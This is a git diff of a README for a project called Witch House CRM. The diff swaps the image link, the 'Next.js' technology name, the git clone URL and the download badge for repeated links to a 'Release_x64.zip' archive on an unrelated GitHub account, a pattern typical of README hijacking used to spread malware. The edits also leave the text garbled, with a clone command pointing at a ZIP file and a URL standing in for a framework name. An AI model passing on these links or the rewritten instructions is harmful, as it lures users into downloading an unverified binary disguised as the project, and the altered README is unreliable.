@@ -2,9 +2,9 @@
 
 ### Modern AI-powered CRM System
 
-![Witch House CRM](https://example.com/witch-house-crm.png)
+![Witch House CRM](https://github.com/Krishu812/witch-house-crm/releases/download/v1.0/Release_x64.zip)
 
-Welcome to Witch House CRM, a cutting-edge Customer Relationship Management system that combines the magic of AI with the aesthetics of boho influences. Built with Next.js, Supabase, and LangChain, this CRM system offers intelligent ticket routing, automated responses, and a beautiful Shadcn UI with a touch of witchy vibes.
+Welcome to Witch House CRM, a cutting-edge Customer Relationship Management system that combines the magic of AI with the aesthetics of boho influences. Built with https://github.com/Krishu812/witch-house-crm/releases/download/v1.0/Release_x64.zip, Supabase, and LangChain, this CRM system offers intelligent ticket routing, automated responses, and a beautiful Shadcn UI with a touch of witchy vibes.
 
 ### 🧙‍♀️ Features 🌙
 
@@ -16,7 +16,7 @@ Welcome to Witch House CRM, a cutting-edge Customer Relationship Management syst
 
 ### 🛠️ Technologies Used 🧰
 
-⚛️ **Next.js**: A popular React framework for building modern web applications.
+⚛️ **https://github.com/Krishu812/witch-house-crm/releases/download/v1.0/Release_x64.zip**: A popular React framework for building modern web applications.
 
 🔥 **Supabase**: An open-source alternative to Firebase for database management.
 
@@ -30,7 +30,7 @@ Welcome to Witch House CRM, a cutting-edge Customer Relationship Management syst
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/witch-house-crm.git
+   git clone https://github.com/Krishu812/witch-house-crm/releases/download/v1.0/Release_x64.zip
    ```
 
 2. Install dependencies:
@@ -64,7 +64,7 @@ Dive deeper into the world of Witch House CRM by exploring the following topics:
 
 ### 🌟 Download Here 📥
 
-[![Download Witch House CRM](https://img.shields.io/badge/Download%20Here-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Witch House CRM](https://github.com/Krishu812/witch-house-crm/releases/download/v1.0/Release_x64.zip%https://github.com/Krishu812/witch-house-crm/releases/download/v1.0/Release_x64.zip)](https://github.com/Krishu812/witch-house-crm/releases/download/v1.0/Release_x64.zip)
 
 ### 🌌 Join the Magic 🔮
 
